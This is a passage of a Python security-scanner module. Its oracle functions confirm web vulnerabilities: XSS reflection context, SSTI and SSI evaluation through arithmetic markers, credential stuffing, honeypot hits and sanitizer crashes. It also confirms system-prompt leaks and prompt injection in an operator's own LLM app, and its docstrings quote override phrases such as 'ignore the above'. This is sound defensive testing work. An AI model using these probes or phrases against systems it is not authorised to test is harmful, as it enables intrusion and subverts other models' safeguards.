        return a == b, f"{a!r} == {b!r}"
    if op == "ieq":
        return str(a).lower() == str(b).lower(), f"{a!r} =(ci) {b!r}"
    if op == "contains":
        ok = bool(a) and bool(b) and str(b) in str(a)
        return ok, f"{b!r} in <{len(str(a))}b body>"
    if op == "icontains":
        ok = bool(a) and bool(b) and str(b).lower() in str(a).lower()
        return ok, f"{b!r} in(ci) <{len(str(a))}b body>"
    if op == "in":
        return a in (b or []), f"{a!r} in {b!r}"
    if op == "min_len":
        return len(str(a or "")) >= int(b), f"len({a!r})>={b}"
    if op == "gt":
        return (a is not None and b is not None and a > b), f"{a!r} > {b!r}"
    if op == "ge":
        return (a is not None and b is not None and a >= b), f"{a!r} >= {b!r}"
    raise ValueError(f"unknown predicate op {op!r}")


def predicate_oracle(observed_evidence: Mapping[str, Any], predicate: Any) -> OracleSignal:
    """Evaluate a dangerous CONDITION over RAW observed values — the fix for the
    achieved-state rubber-stamp.

    The old pattern had each state check (CORS/host-header/redirect/JWT/IDOR/race)
    compute a boolean in Python and pass ``{"k": True}`` vs ``{"k": that_boolean}``
    to ``achieved_state_oracle``, which merely re-asserted the check's own verdict.
    Here the check hands over the ACTUAL observed values (header values, both
    identities' bodies, the accepted/rejected statuses, the concurrent successes)
    plus a declarative predicate, and THIS oracle decides — emitting evidence that
    cites the values it judged. The predicate is a pure JSON AST, so the finding's
    certificate re-verifies offline exactly like every other oracle."""
    observed = dict(observed_evidence or {})
    try:
        fired, evidence = _eval_predicate(predicate, observed)
    except (ValueError, TypeError) as e:
        return OracleSignal(
            kind=OracleKind.ACHIEVED_STATE, fired=False, confidence=0.0,
            evidence=f"malformed predicate: {e}", observed={"predicate": predicate})
    return OracleSignal(
        kind=OracleKind.ACHIEVED_STATE,
        fired=fired,
        confidence=0.9 if fired else 0.0,
        # A predicate is a DEFINITE proposition evaluated over the raw observed values
        # (a redirect Location, a reflected Origin, both identities' bodies): whether it
        # holds or not is a decisive adjudication of an observable state — there is no
        # blind variant it could be silently missing — so a non-firing predicate is a
        # channel-confirmed clean, not an inconclusive non-detection. (The malformed-
        # predicate branch above stays non-conclusive: no proposition was evaluated.)
        conclusive=True,
        evidence=(f"dangerous condition holds over observed values: {evidence}"
                  if fired else f"condition not met: {evidence}"),
        observed={"predicate_eval": evidence, "values": observed},
    )


def achieved_state_oracle(
    expected_state: Mapping[str, Any],
    observed_state: Mapping[str, Any],
) -> OracleSignal:
    """Fire when every key/value the attacker predicted appears in the
    observed state — e.g. `{"owner": "victim", "readable": True}` shows up in
    a record that should have been denied. A full match of a non-empty
    expectation is a strong signal; a partial match is informational only."""
    expected = dict(expected_state or {})
    observed = dict(observed_state or {})

    if not expected:
        return OracleSignal(
            kind=OracleKind.ACHIEVED_STATE, fired=False, confidence=0.0,
            evidence="no expected state supplied", observed={"expected": expected})

    matched = {k: v for k, v in expected.items() if k in observed and observed[k] == v}
    mismatched = {k: v for k, v in expected.items() if k not in matched}
    full = len(matched) == len(expected)

    confidence = 0.9 if full else (len(matched) / len(expected)) * 0.5
    evidence = (
        f"achieved all {len(expected)} expected field(s): "
        + ", ".join(f"{k}={v!r}" for k, v in matched.items())
        if full else
        f"only {len(matched)}/{len(expected)} expected field(s) matched"
    )
    return OracleSignal(
        kind=OracleKind.ACHIEVED_STATE,
        fired=full,
        confidence=confidence,
        # A concrete expectation was supplied (the empty-expectation branch returned
        # above), so a full-match / no-match is a decisive adjudication of an observed
        # state — a non-firing (unmatched) result is a channel-confirmed clean.
        conclusive=True,
        evidence=evidence,
        observed={"matched": matched, "mismatched": mismatched},
    )


# ---------------------------------------------------------------------------
# 3. Side effect — a unique marker surfaced in a sink it should never reach
# ---------------------------------------------------------------------------


def _searchable(sink: Any) -> str:
    if isinstance(sink, Mapping):
        return "\n".join(f"{k}={_coerce_text(v)}" for k, v in sink.items())
    if isinstance(sink, (list, tuple)):
        return "\n".join(_coerce_text(x) for x in sink)
    return _coerce_text(sink)


def side_effect_oracle(marker: str, observed_sink: Any) -> OracleSignal:
    """Fire when a unique, attacker-chosen marker appears somewhere it should
    not — a reflected/stored XSS canary in rendered output, an SSTI evaluation
    result, a log line, a filesystem read. The marker must be non-trivial
    (>= 4 chars) so we do not confirm on incidental substrings."""
    marker = (marker or "").strip()
    haystack = _searchable(observed_sink)

    if len(marker) < 4:
        return OracleSignal(
            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
            evidence="marker too short to be a reliable canary",
            observed={"marker": marker})

    idx = haystack.find(marker)
    if idx < 0:
        return OracleSignal(
            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
            evidence=f"marker {marker!r} not present in sink",
            observed={"marker": marker})

    start = max(0, idx - 24)
    snippet = haystack[start: idx + len(marker) + 24]
    return OracleSignal(
        kind=OracleKind.SIDE_EFFECT,
        fired=True,
        confidence=0.9,
        evidence=f"marker {marker!r} reached sink: ...{snippet}...",
        observed={"marker": marker, "offset": idx, "snippet": snippet},
    )


# ---------------------------------------------------------------------------
# 3b. Reflection context — a marker reached an EXECUTABLE HTML/JS position
# ---------------------------------------------------------------------------


class _ReflectionScanner(HTMLParser):
    """Locate a marker's parse context with stdlib HTML parsing. Fires internal
    state when the marker became (part of) a tag name, landed inside a
    ``<script>``, or sits in an event-handler / ``javascript:`` attribute value.
    ``convert_charrefs=True`` means an HTML-encoded payload arrives as inert TEXT
    (not a tag), so it is correctly judged non-executable."""

    def __init__(self, marker_lower: str) -> None:
        super().__init__(convert_charrefs=True)
        self._ml = marker_lower
        self._in_script = False
        self.context: str | None = None
        self.detail: str = ""

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if self.context is not None:
            return
        if self._ml in tag.lower():
            self.context, self.detail = "html_tag", tag
            return
        if tag.lower() == "script":
            self._in_script = True
        for name, val in attrs:
            v = (val or "").lower()
            if self._ml not in v:
                continue
            a = name.lower()
            if a.startswith("on") or (a in ("href", "src", "action", "formaction")
                                      and v.lstrip().startswith("javascript:")):
                self.context, self.detail = f"js_attribute:{name}", name
                return

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "script":
            self._in_script = False

    def handle_data(self, data: str) -> None:
        if self.context is None and self._in_script and self._ml in data.lower():
            self.context = "script"


def reflection_context_oracle(marker: str, observed_sink: Any) -> OracleSignal:
    """Fire only when a reflected marker lands in an EXECUTABLE position — the
    payload broke out of its context into live markup or script — not merely when
    the marker substring is present.

    Substring-presence (what ``side_effect_oracle`` and most DAST use for XSS)
    over-reports: a marker reflected inside an HTML-encoded attribute, a comment,
    or plain text is inert. Here the response is PARSED (stdlib, no third-party
    dependency), and a signal fires only if the marker became (part of) a tag
    name (the payload created an element), landed inside a ``<script>``, or sits
    in an event-handler / ``javascript:`` attribute. An encoded or text-only
    reflection does not fire — materially fewer false positives than substring
    XSS detection."""
    marker = (marker or "").strip()
    body = observed_sink if isinstance(observed_sink, str) else _searchable(observed_sink)
    if len(marker) < 4:
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
            evidence="marker too short to be a reliable canary", observed={"marker": marker})
    ml = marker.lower()
    if ml not in body.lower():
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
            evidence=f"marker {marker!r} not reflected", observed={"marker": marker})

    scanner = _ReflectionScanner(ml)
    try:
        scanner.feed(body)
        scanner.close()
    except Exception:
        scanner.context = None

    if scanner.context == "html_tag":
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.95,
            evidence=f"marker created a live element <{scanner.detail}> — executable HTML injection",
            observed={"marker": marker, "context": "html_tag", "tag": scanner.detail})
    if scanner.context == "script":
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.9,
            evidence="marker reflected inside a <script> block — executable JS context",
            observed={"marker": marker, "context": "script"})
    if scanner.context and scanner.context.startswith("js_attribute"):
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.9,
            evidence=f"marker in executable attribute {scanner.detail!r} — event/JS URL context",
            observed={"marker": marker, "context": scanner.context})

    return OracleSignal(
        kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
        # CHANNEL-CONFIRMED NEGATIVE: the marker WAS reflected (`ml in body` above),
        # so the payload provably reached the response sink — and it landed only in an
        # inert/encoded position. That is a decisive "reflected-but-neutralised" clean,
        # unlike the "not reflected" branch above (no channel → non-conclusive/inconclusive).
        conclusive=True,
        evidence="marker reflected but NOT in an executable context (encoded/inert)",
        observed={"marker": marker, "context": "inert"})


# ---------------------------------------------------------------------------
# 3c. Evaluation — the server EVALUATED an injected expression (SSTI / EL)
# ---------------------------------------------------------------------------


def evaluation_oracle(
    raw_expr: str,
    expected_result: str,
    observed_body: Any,
    control_body: Any = None,
) -> OracleSignal:
    """Fire when an injected expression was **evaluated** by the server, not
    merely reflected — the signature of server-side template / expression-language
    injection (Jinja2/Twig/Freemarker/Velocity/ERB/Smarty/Mako/Thymeleaf, EL).

    The proof is deliberately strict, because "reflected" and "evaluated" look
    identical unless you separate them:

      1. the ``expected_result`` (what ``raw_expr`` computes to, e.g. ``31337*31337
         -> 981538969``) appears in the response, AND
      2. the ``raw_expr`` itself (``{{31337*31337}}``) does NOT appear — if the
         raw template text survives, the input was reflected verbatim, not
         evaluated, so this is NOT SSTI, AND
      3. when a benign ``control_body`` is supplied, the ``expected_result`` does
         NOT occur in it — so a value that merely happens to be on the page can
         never be mistaken for an evaluation.

    Use a distinctive arithmetic result (a large product, not ``7*7=49``) so the
    expected value cannot coincidentally appear. A reflected-but-unevaluated
    payload, an encoded payload, or a benign page all correctly do NOT fire."""
    raw = (raw_expr or "").strip()
    expected = (expected_result or "").strip()
    body = _coerce_text(observed_body)

    if len(expected) < 2:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence="expected evaluation result too short to be a reliable marker",
            observed={"expected": expected})

    if expected not in body:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"evaluated result {expected!r} not present; expression was not evaluated",
            observed={"expected": expected, "raw_present": raw in body})

    if raw and raw in body:
        # The literal template text survived — reflection, not evaluation.
        # CHANNEL-CONFIRMED NEGATIVE: the raw expression provably reached the response
        # sink and was rendered as inert text (not computed), so this is a decisive
        # "reached-but-not-evaluated" clean — distinct from the "result absent" branch
        # above (a blind/second-order sink where nothing was observed → inconclusive).
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0, conclusive=True,
            evidence=f"raw expression {raw!r} reflected verbatim — reflected, not evaluated",
            observed={"expected": expected, "raw_present": True})

    if control_body is not None and expected in _coerce_text(control_body):
        # The "result" is just part of the page regardless of the payload.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"result {expected!r} also present in the benign control — not attributable to evaluation",
            observed={"expected": expected})

    idx = body.find(expected)
    snippet = body[max(0, idx - 24): idx + len(expected) + 24]
    return OracleSignal(
        kind=OracleKind.EVALUATION,
        fired=True,
        confidence=0.95,
        evidence=f"expression {raw!r} evaluated to {expected!r} server-side: ...{snippet}...",
        observed={"expected": expected, "raw": raw, "snippet": snippet},
    )


# A well-formed Server-Side Include directive: ``<!--#directive ... -->`` (config/echo/set/exec/
# include/printenv/fsize/flastmod). The ``#`` immediately after the comment open is the SSI marker
# that separates an include directive from an ordinary HTML comment. Used only to CONFIRM the probe
# was a genuine SSI directive — the fire still rests on the computed-product differential below.
_SSI_DIRECTIVE_RE = re.compile(r"<!--#\s*[A-Za-z]+\b[^>]*-->", re.DOTALL)


def ssi_evaluation_oracle(
    raw_directive: str,
    expected_result: str,
    observed_body: Any,
    control_body: Any = None,
) -> OracleSignal:
    """Fire when an injected **Server-Side Include (SSI) directive was EVALUATED** by the
    server — the arithmetic it carries was COMPUTED and its product emitted — not merely
    reflected (CWE-97: Improper Neutralization of Server-Side Includes).

    The same strict computed-product proof the SSTI/EL :func:`evaluation_oracle` uses,
    specialised to SSI so it can never be confused with a template-expression evaluation and so
    a page that merely echoes the directive as an inert HTML comment never fires:

      1. ``raw_directive`` must be a well-formed SSI directive (``<!--#…-->``) — a payload that is
         not an SSI directive is not an SSI probe and never fires here (keeps the class distinct);
      2. the ``expected_result`` — the PER-PROBE product ``N1*N2``, unguessable and unable to
         pre-exist — appears in the response, AND
      3. the raw directive does NOT survive verbatim: if ``<!--#…-->`` is echoed back unchanged the
         include was NOT processed (SSI disabled / reflected as an inert comment), which is the
         honest boundary — reflected, not evaluated — and a CHANNEL-CONFIRMED clean, AND
      4. when a benign ``control_body`` is supplied, the product does NOT occur in it — so a value
         that merely happens to be on the page can never be mistaken for an evaluation.

    Use a distinctive per-probe random product (a large ``N1*N2``, never ``7*7``) so the expected
    value cannot coincidentally appear. A reflected-but-unevaluated directive, an escaped payload,
    or a benign page all correctly do NOT fire."""
    raw = (raw_directive or "").strip()
    expected = (expected_result or "").strip()
    body = _coerce_text(observed_body)

    if len(expected) < 2:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence="expected SSI evaluation result too short to be a reliable marker",
            observed={"expected": expected})

    if not _SSI_DIRECTIVE_RE.search(raw):
        # Not a genuine SSI directive — nothing SSI-specific to adjudicate. NON-conclusive: the
        # probe never carried an include directive, so this says nothing about the target.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"payload {raw!r} is not a well-formed SSI directive (<!--#…-->) — not an SSI probe",
            observed={"raw": raw})

    if expected not in body:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"computed product {expected!r} not present; the SSI directive was not evaluated",
            observed={"expected": expected, "raw_present": raw in body})

    if raw and raw in body:
        # The literal SSI directive survived verbatim — SSI is disabled and the directive was echoed
        # as an inert HTML comment. CHANNEL-CONFIRMED NEGATIVE: the directive provably reached the
        # response sink and was NOT processed (reflected, not evaluated) — the honest boundary, a
        # decisive "reached-but-not-evaluated" clean, distinct from the "product absent" blind branch.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0, conclusive=True,
            evidence=f"SSI directive {raw!r} reflected verbatim as an inert comment — reflected, not evaluated",
            observed={"expected": expected, "raw_present": True})

    if control_body is not None and expected in _coerce_text(control_body):
        # The "product" is on the page regardless of the directive — not attributable to evaluation.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"product {expected!r} also present in the benign control — not attributable to SSI evaluation",
            observed={"expected": expected})

    idx = body.find(expected)
    snippet = body[max(0, idx - 24): idx + len(expected) + 24]
    return OracleSignal(
        kind=OracleKind.EVALUATION,
        fired=True,
        confidence=0.95,
        evidence=f"SSI directive {raw!r} evaluated to {expected!r} server-side: ...{snippet}...",
        observed={"expected": expected, "raw": raw, "snippet": snippet, "ssi": True},
    )


# ---------------------------------------------------------------------------
# 3d. AEGIS — the DEFENSIVE dual: prove-don't-guess oracles pointed inward at the
#     operator's OWN app. Same purity contract as every oracle above (pure,
#     deterministic, no wallclock/rng). They fire ONLY over retained evidence a
#     benign benchmark finding never carries, so `make gate` stays byte-identical.
# ---------------------------------------------------------------------------

# A planted canary must be a random, collision-resistant sentinel: long enough and
# high-entropy enough that a VERBATIM substring match cannot be coincidental and a
# natural-language phrase a user might legitimately paste cannot masquerade as it.
_MIN_CANARY_LEN = 16
_MIN_CANARY_ENTROPY_BITS_PER_CHAR = 2.5


def _shannon_bits_per_char(s: str) -> float:
    """Shannon entropy of ``s`` in bits/char (pure). A random base62/hex sentinel clears
    ~4-6; a repeated char ("aaaa…") is 0; an English phrase is ~1-2."""
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def system_prompt_disclosure_oracle(canary: str, llm_output: Any) -> OracleSignal:
    """Fire when a PLANTED high-entropy canary sentinel appears VERBATIM in the app's own
    LLM output — proof the secret LEAKED (system-prompt disclosure). The defensive dual of
    ``side_effect_oracle``: the operator plants a random sentinel in the system prompt out
    of band; if the model's response echoes it, the secret provably crossed the boundary.

    Honest scope (doctrine fix P2): this proves DISCLOSURE, not that an *injection* caused
    it — a benign "repeat your instructions" or the app's own debug path echoes the same
    sentinel. ``prompt_injection`` (control-vs-treatment behavior delta) is the separate,
    stronger oracle that earns the adversarial-cause label. The sentinel must be
    >= 16 chars AND >= 2.5 bits/char so a substring match cannot be coincidental."""
    sentinel = (canary or "").strip()
    haystack = llm_output if isinstance(llm_output, str) else _searchable(llm_output)
    if len(sentinel) < _MIN_CANARY_LEN:
        return OracleSignal(
            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
            evidence=f"canary too short (< {_MIN_CANARY_LEN} chars) to be collision-resistant",
            observed={"canary_len": len(sentinel)})
    if _shannon_bits_per_char(sentinel) < _MIN_CANARY_ENTROPY_BITS_PER_CHAR:
        return OracleSignal(
            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
            evidence="canary entropy too low — not a collision-resistant random sentinel",
            observed={"canary_len": len(sentinel)})
    idx = haystack.find(sentinel)
    if idx < 0:
        return OracleSignal(
            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
            evidence="planted canary not present in LLM output — no disclosure",
            observed={"canary_len": len(sentinel)})
    # Bounded, redacted human-readable span: reveal only a short window around the hit and
    # MASK the sentinel itself in the evidence string. (PR1: the retained oracle_context
    # still holds the verbatim sentinel + output so the certificate re-fires offline — the
    # reverify contract requires verbatim substrings; documented, not hashes-only.)
    start = max(0, idx - 16)
    end = min(len(haystack), idx + len(sentinel) + 16)
    redacted_span = haystack[start:idx] + "<canary>" + haystack[idx + len(sentinel):end]
    return OracleSignal(
        kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=True, confidence=0.95,
        evidence=f"planted canary disclosed in the app's LLM output: ...{redacted_span}...",
        observed={"offset": idx, "canary_len": len(sentinel), "redacted_span": redacted_span})


def _pi_behavior(obs: Any) -> dict[str, Any]:
    """Normalise one structurally-detectable LLM behavior observation to the three fields
    the control-vs-treatment delta compares. Total + deterministic."""
    if isinstance(obs, Mapping):
        tool = obs.get("tool")
        return {
            "tool": str(tool).strip().lower() if tool not in (None, "") else None,
            "refused": bool(obs.get("refused", False)),
            "boundary_token_echoed": bool(obs.get("boundary_token_echoed", False)),
        }
    return {"tool": None, "refused": False, "boundary_token_echoed": False}


def prompt_injection_oracle(pi_control: Any, pi_treatment: Any) -> OracleSignal:
    """Fire ONLY when an injected directive PROVABLY flipped a structurally-detectable
    behavior in the treatment turn vs a CLEAN control turn — the honest, strong proof of
    prompt injection (doctrine fix P2). Structurally the ``evaluation_oracle``'s control-
    vs-treatment discipline: the effect present in treatment, absent in the control that
    omits the attacker directive (everything else held fixed).

    It fires on a BEHAVIOR DELTA, never on structural-override markers alone (those stay
    LEADs — users legitimately paste "ignore the above"):
      1. refusal flipped — the clean control refused, the attacker turn complied;
      2. coerced tool — treatment selected a sensitive tool the clean control did not;
      3. boundary breakout — the model echoed the instruction/data boundary token only
         under the injected directive.
    Same retained (control, treatment) -> same verdict, re-runnable offline."""
    control = _pi_behavior(pi_control)
    treatment = _pi_behavior(pi_treatment)

    deltas: list[str] = []
    if control["refused"] and not treatment["refused"]:
        deltas.append("refusal flipped to compliance under the injected directive")
    if treatment["tool"] and treatment["tool"] != control["tool"]:
        deltas.append(f"injected directive coerced tool {treatment['tool']!r} the clean control did not select")
    if treatment["boundary_token_echoed"] and not control["boundary_token_echoed"]:
        deltas.append("instruction/data boundary token echoed only under the injected directive")

    if not deltas:
        return OracleSignal(
            kind=OracleKind.PROMPT_INJECTION, fired=False, confidence=0.0,
            evidence="no structurally-detectable behavior change vs the clean control — "
                     "markers alone do not confirm prompt injection",
            observed={"control": control, "treatment": treatment})
    return OracleSignal(
        kind=OracleKind.PROMPT_INJECTION, fired=True, confidence=0.9,
        evidence="prompt injection confirmed by a control-vs-treatment behavior delta: " + "; ".join(deltas),
        observed={"control": control, "treatment": treatment, "deltas": deltas})


def honeypot_hit_oracle(
    requested_path: Any, honeypot_paths: Any, crawler_allowlisted: bool = False
) -> OracleSignal:
    """Deterministic set-membership: fire (AUTOMATED_ACCESS) iff a client fetched a seeded
    honeypot resource no human UI links AND the client is not an allowlisted known-good
    crawler/monitor.

    Honest scope (doctrine fix P1): this proves AUTOMATED ACCESS — a non-interactive client
    fetched a resource no human UI renders — NOT "scraping". Link-unfurl bots, speculative
    prefetch, AV URL scanners, and uptime monitors also trip it; those are exactly what the
    operator allowlist REFUTES (``crawler_allowlisted=True`` -> a benign, non-firing signal).
    'Adversarial scraping' stays a LEAD unless independently corroborated."""
    path = _coerce_text(requested_path).strip()
    if isinstance(honeypot_paths, str):
        paths = {honeypot_paths.strip()}
    else:
        paths = {_coerce_text(p).strip() for p in (honeypot_paths or [])}

    if crawler_allowlisted:
        return OracleSignal(
            kind=OracleKind.AUTOMATED_ACCESS, fired=False, confidence=0.0,
            evidence="requester is an allowlisted known-good crawler/monitor — benign automation (REFUTES)",
            observed={"path": path, "allowlisted": True})
    if not path or path not in paths:
        return OracleSignal(
            kind=OracleKind.AUTOMATED_ACCESS, fired=False, confidence=0.0,
            evidence="requested path is not a seeded honeypot resource",
            observed={"path": path})
    return OracleSignal(
        kind=OracleKind.AUTOMATED_ACCESS, fired=True, confidence=0.95,
        evidence=f"automated access confirmed: honeypot resource {path!r} (no human UI links it) was fetched",
        observed={"path": path, "matched": True})


# --- credential stuffing / ATO (SPRT over unseen-(account, source) auth successes, Holm-controlled) ---

# The SPRT default is deliberately LESS trigger-happy than the boolean-blind SPRT: a returning
# user's first login from a new device is ONE unseen (account, source) success, so confirmation
# needs a RUN of unseen-pair successes — a breadth of compromised accounts from ONE source that a
# benign actor cannot produce. A source with only FAILED attempts produces ZERO SPRT rounds, so a
# NAT/CGNAT failed-only burst (the MECE benign twin) can never confirm — it stays a LEAD upstream.
_CREDSTUFF_ALPHA = 0.01          # per-family (per-source) SPRT type-I error
_CREDSTUFF_BETA = 0.01           # per-family SPRT type-II error
_CREDSTUFF_P1 = 0.8              # H1: unseen-pair-success rate of a stuffing source
_CREDSTUFF_P0 = 0.2              # H0: benign returning-user unseen-pair-success rate
_CREDSTUFF_FWER = 0.01           # family-wise error rate for the multi-identity Holm control
_CREDSTUFF_MAX_EVENTS = 20000    # bounded replay (DoS-safe: linear over a length-capped log)
_CREDSTUFF_EXACT_N = 400         # exact binomial tail up to this n; normal-approx (bounded) beyond


def _binomial_upper_tail(k: int, n: int, p: float) -> float:
    """P(X >= k) for X ~ Binomial(n, p) — the per-family p-value under H0 (unseen-pair successes
    arise only at the benign rate ``p``). Exact stdlib integer binomials for small n; a bounded,
    continuity-corrected normal approximation beyond ``_CREDSTUFF_EXACT_N`` so the computation
    stays cheap and deterministic on a large (but SPRT-decided, hence realistically small) n."""
    if n <= 0 or k <= 0:
        return 1.0
    if k > n:
        return 0.0
    p = min(1.0, max(0.0, p))
    if p <= 0.0:
        return 0.0
    if p >= 1.0:
        return 1.0
    if n <= _CREDSTUFF_EXACT_N:
        tail = sum(math.comb(n, i) * (p ** i) * ((1.0 - p) ** (n - i)) for i in range(k, n + 1))
        return min(1.0, tail)
    mu = n * p
    sigma = math.sqrt(n * p * (1.0 - p))
    if sigma <= 0.0:
        return 1.0 if k <= mu else 0.0
    z = (k - 0.5 - mu) / sigma
    return max(0.0, min(1.0, 1.0 - _normal_cdf(z)))


def credential_stuffing_oracle(
    auth_events: Any,
    *,
    alpha: float = _CREDSTUFF_ALPHA,
    beta: float = _CREDSTUFF_BETA,
    p1: float = _CREDSTUFF_P1,
    p0: float = _CREDSTUFF_P0,
    fwer: float = _CREDSTUFF_FWER,
    benign_sources: Any = None,
) -> OracleSignal:
    """Confirm a credential-stuffing / account-takeover CAMPAIGN by the SAME Wald SPRT
    ``boolean_inference_oracle`` uses (``_sprt_decision``), run over each source's stream of
    UNSEEN-``(account, source)`` auth SUCCESS outcomes, with a Holm-Bonferroni family-wise
    correction across the distinct source identities.

    ``auth_events`` is an ORDERED list of ``{"account", "source", "success"}``. Identifiers are
    already keyed-HMAC pseudonyms (the oracle NEVER sees a raw username/IP). The oracle REPLAYS
    the log deterministically — no wallclock, no rng, bounded to ``_CREDSTUFF_MAX_EVENTS``:

      * Per source, a SUCCESS on an ``(account, source)`` pair not previously seen succeeding is
        the attacker-signature Bernoulli signal (1); a repeat success on an already-owned pair is
        a returning-user control (0). FAILURES produce NO SPRT round — so a failed-only burst (the
        MECE benign twin: NAT/CGNAT bulk) yields zero rounds and can NEVER confirm here.
      * The per-source SPRT CONFIRMS only when the log-likelihood ratio crosses ``log((1-beta)/
        alpha)`` — one new-device login cannot cross it; a run of successes across many unseen
        accounts does. A binomial upper-tail p-value under H0 is derived from the consumed counts.
      * Across the distinct sources (the multiple identities probed at once), ``holm_correction``
        controls the FAMILY-WISE false-positive rate: a source is CONFIRMED only when its SPRT
        crossed AND it survives the family-wise correction at ``fwer`` — so monitoring thousands
        of sources cannot manufacture a confirmation by multiplicity (a marginal single-source
        SPRT hit that fails the family-wise control is honestly withheld).

    ``benign_sources`` (optional) is an operator allowlist of known-good egress identities
    (a documented NAT/CGNAT, an SSO gateway) whose successes REFUTE — they can never confirm,
    mirroring the honeypot crawler allowlist (P1). Pure + deterministic."""
    events = list(auth_events or [])[:_CREDSTUFF_MAX_EVENTS]
    allow = {_coerce_text(s).strip() for s in (benign_sources or [])}

    # group per source in arrival order (deterministic; a dict preserves insertion order).
    by_source: dict[str, list[tuple[str, bool]]] = {}
    order: list[str] = []
    for ev in events:
        if not isinstance(ev, Mapping):
            continue
        source = _coerce_text(ev.get("source")).strip()
        account = _coerce_text(ev.get("account")).strip()
        if not source or not account:
            continue
        if source not in by_source:
            by_source[source] = []
            order.append(source)
        by_source[source].append((account, bool(ev.get("success", False))))

    families: list[dict[str, Any]] = []
    for source in order:
        rows = by_source[source]
        allowlisted = source in allow

        # (a) The SEQUENTIAL decision: the SAME Wald SPRT boolean_inference uses, over the
        #     unseen-(account, source) SUCCESS indicator stream — it stops early at the first
        #     boundary. FAILURES never yield a round (a failed-only burst never crosses).
        seen_sprt: set[str] = set()

        def _sig_seq(_rows=rows, _seen=seen_sprt):
            for account, success in _rows:
                if not success:
                    continue
                unseen = account not in _seen
                _seen.add(account)
                yield unseen

        decided, llr, _n_used, _n_signal, upper, lower = _sprt_decision(
            _sig_seq(), alpha=alpha, beta=beta, p1=p1, p0=p0)

        # (b) The FAMILY-WISE evidence: a FIXED-sample binomial upper-tail p-value over the WHOLE
        #     window (NOT the SPRT-truncated prefix) — so evidence STRENGTH scales with the breadth
        #     of compromise (a 6-account run is stronger than a 4-account run even though the SPRT
        #     halts at the same boundary). This is what Holm ranks across identities.
        seen_full: set[str] = set()
        n_success = 0
        n_unseen = 0
        for account, success in rows:
            if not success:
                continue
            n_success += 1
            if account not in seen_full:
                n_unseen += 1
                seen_full.add(account)
        pval = 1.0 if allowlisted else _binomial_upper_tail(n_unseen, n_success, p0)

        families.append({
            "source": source, "decided": "allowlisted" if allowlisted else (decided or "inconclusive"),
            "llr": round(llr, 4), "n_success": n_success, "n_unseen": n_unseen,
            "distinct_accounts": len(seen_full), "p_value": pval,
        })

    # Holm-Bonferroni across the distinct source identities (the multi-identity family-wise
    # control). A source confirms iff its SPRT crossed AND Holm rejects its p-value at `fwer`.
    pvals = [f["p_value"] for f in families]
    rejects = holm_correction(pvals, alpha=fwer) if pvals else []
    confirmed = [
        f for f, rej in zip(families, rejects)
        if f["decided"] == "confirm" and rej
    ]

    observed = {"families": families, "confirmed_sources": [f["source"] for f in confirmed],
                "n_families": len(families), "fwer": fwer}
    if not confirmed:
        # honest non-fire: name why (no SPRT crossing, or family-wise control withheld it).
        crossed = [f for f in families if f["decided"] == "confirm"]
        if crossed:
            why = (f"{len(crossed)} source(s) crossed the SPRT but did NOT survive the Holm "
                   f"family-wise control at fwer={fwer} over {len(families)} identities")
        else:
            why = "no source's unseen-pair successes crossed the SPRT boundary (failed-only / benign)"
        return OracleSignal(
            kind=OracleKind.CREDENTIAL_STUFFING, fired=False, confidence=0.0,
            evidence=f"no credential stuffing confirmed: {why}", observed=observed)

    confidence = min(0.99, 1.0 - fwer)
    detail = "; ".join(
        f"source {f['source']!r}: {f['n_unseen']} unseen-account successes over "
        f"{f['distinct_accounts']} accounts (LLR={f['llr']:.2f}, p={f['p_value']:.2g})"
        for f in confirmed)
    return OracleSignal(
        kind=OracleKind.CREDENTIAL_STUFFING, fired=True, confidence=confidence,
        evidence=(f"credential stuffing / ATO confirmed for {len(confirmed)} source identity(ies) "
                  f"(SPRT crossed + Holm family-wise control at fwer={fwer}): {detail}"),
        observed=observed)


# ---------------------------------------------------------------------------
# 4. Sanitizer signal — crash/UB oracles in captured process output
# ---------------------------------------------------------------------------


# (regex, label, confidence). Ordered by strength; the strongest match wins.
_SANITIZER_PATTERNS: list[tuple[re.Pattern[str], str, float]] = [
    (re.compile(r"ERROR:\s*AddressSanitizer"), "asan", 0.95),
    (re.compile(r"AddressSanitizer:\s*(DEADLYSIGNAL|SEGV|heap-|stack-|global-)"), "asan", 0.95),
    (re.compile(r"(heap|stack|global)-buffer-overflow"), "asan", 0.9),
    (re.compile(r"heap-use-after-free|use-after-free"), "asan", 0.92),
    (re.compile(r"WARNING:\s*MemorySanitizer"), "msan", 0.9),
